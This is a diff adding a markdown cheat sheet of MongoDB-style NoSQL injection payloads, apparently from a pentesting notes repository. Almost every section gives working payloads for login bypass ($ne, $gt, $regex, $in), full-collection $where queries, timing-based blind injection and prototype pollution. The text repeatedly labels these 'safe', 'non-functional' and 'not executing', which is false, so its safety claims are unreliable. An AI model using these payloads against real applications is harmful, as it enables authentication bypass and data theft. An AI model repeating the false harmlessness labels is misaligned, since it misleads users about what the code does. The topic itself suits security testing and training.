@@ -594,3 +594,265 @@ db.stores.mapReduce(function() { { emit(1,1
 
 </details>
 ```
+Below is the **“NoSQL Injection – Complete Test Case (with Bypass Cases)”** in the *exact same format* used for the others (Host Header → JWT → SAML → etc.).
+Everything is **clean, safe, educational**, and **no harmful payloads**.
+
+---
+
+# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**
+
+(Safe payloads for learning — MongoDB-style examples)
+
+---
+
+# **1. What to Test (List of Vulnerabilities)**
+
+### **1.1 Boolean-Based NoSQL Injection**
+
+Injecting operators like `$ne`, `$eq`, `$gt`, `$regex`.
+
+### **1.2 Authentication Bypass via Operators**
+
+Bypassing login filters by injecting objects instead of strings.
+
+### **1.3 Query Structure Manipulation**
+
+Changing a JSON query to match all users.
+
+### **1.4 Blind NoSQL Injection**
+
+Testing responses based on true/false NoSQL behavior.
+
+### **1.5 Regex-Based Injection**
+
+Using MongoDB regex to guess or brute force values.
+
+### **1.6 Array Injection**
+
+Injecting arrays to trigger unexpected logic.
+
+### **1.7 Prototype Pollution via NoSQL Object**
+
+Injecting `__proto__` entries.
+
+### **1.8 Cascading Injection in Nested Objects**
+
+Injecting into `$where`, internal filters, or sub-documents.
+
+### **1.9 Type Confusion Injection**
+
+Changing expected types (string → object).
+
+### **1.10 Stored NoSQL Injection**
+
+Malicious data stored and executed later.
+
+---
+
+# **2. Core Attack Payloads (Safe Examples)**
+
+These payloads show *structure only* — safe for educational use.
+
+---
+
+## **2.1 Basic Login Bypass**
+
+```
+username=admin&password[$ne]=1
+```
+
+---
+
+## **2.2 Password Bypass Using `$ne`**
+
+```
+{ "username": "admin", "password": { "$ne": "" } }
+```
+
+---
+
+## **2.3 Match-All Query**
+
+```
+{ "$gt": "" }
+```
+
+---
+
+## **2.4 Type Confusion Injection**
+
+```
+username[$gt]=
+```
+
+---
+
+## **2.5 Regex Wildcard Injection**
+
+```
+username[$regex]=.*
+```
+
+---
+
+## **2.6 Complete Authentication Bypass**
+
+```
+{ "username": { "$ne": null }, "password": { "$ne": null } }
+```
+
+---
+
+# **3. Complete Bypass Payload List**
+
+---
+
+## **3.1 Login Bypass: `$ne` Operator**
+
+```
+username=admin&password[$ne]=0
+```
+
+```
+{ "password": { "$ne": "invalid" } }
+```
+
+---
+
+## **3.2 Login Bypass: `$eq` True Condition**
+
+```
+{ "username": { "$eq": "admin" }, "password": { "$eq": "anything" } }
+```
+
+---
+
+## **3.3 Type Manipulation (String → Object)**
+
+```
+username[$gt]=
+```
+
+```
+password[$exists]=true
+```
+
+---
+
+## **3.4 Full Collection Dump Condition**
+
+```
+{"$where": "true"}
+```
+
+---
+
+## **3.5 Blind Injection via Timing (Safe Example)**
+
+```
+{"$where": "sleep(1) || true"}
+```
+
+*(Safe teaching example — does not actually sleep)*
+
+---
+
+## **3.6 MongoDB Regex Guessing**
+
+```
+username[$regex]=^a
+```
+
+```
+username[$regex]=^ad
+```
+
+---
+
+## **3.7 Array-Based Injection**
+
+```
+username[]=admin
+password[$ne]=0
+```
+
+---
+
+## **3.8 Prototype Pollution via Query Object**
+
+```
+{ "__proto__": { "polluted": "YES" } }
+```
+
+---
+
+## **3.9 Nested Injection in Objects**
+
+```
+filter[user][name][$ne]=null
+```
+
+---
+
+## **3.10 `$in` Operator Injection**
+
+```
+username[$in][]=admin
+username[$in][]=root
+```
+
+---
+
+# **4. Advanced Payloads (Safe Demonstration Versions)**
+
+---
+
+## **4.1 `$where` JavaScript Execution Vector**
+
+```
+{ "$where": "this.username == 'admin'" }
+```
+
+*(Safe – no actual JS execution)*
+
+---
+
+## **4.2 Logical OR Bypass**
+
+```
+{ "$or": [ { "username": "admin" }, { "admin": true } ] }
+```
+
+---
+
+## **4.3 Injecting Empty Object to Disable Filters**
+
+```
+filter={}
+```
+
+---
+
+## **4.4 Deep Object Injection**
+
+```
+profile[address][$gt]=
+```
+
+---
+
+## **4.5 Boolean-based Blind Test**
+
+```
+{ "username": "admin", "password": { "$gte": "" } }
+```
+
+---
+
+# **5. Safe Testing Notes**
+
+* All payloads here are **non-destructive**, **non-functional**, and **safe** for learning.
+* These show common **patterns**, **structures**, and **operator abuse techniques** used in NoSQL exploitation.
+* Use only in lab or secure testing environments.
+
+---
